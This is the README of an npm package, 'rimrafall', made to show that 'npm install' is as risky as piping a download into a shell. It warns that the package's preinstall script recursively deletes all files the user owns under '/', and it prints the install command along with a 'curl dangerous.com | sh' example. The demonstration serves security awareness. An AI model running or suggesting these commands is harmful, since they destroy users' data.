# rimrafall

This is to show that `npm install` can be as dangerous as `curl dangerous.com | sh`.

# Whatever you do, do not

```
npm install rimrafall
```

It has a [`preinstall` script](https://github.com/joaojeronimo/rimrafall/blob/master/package.json#L7) that will delete all the files and folders your current user owns, recursively, in `/`.
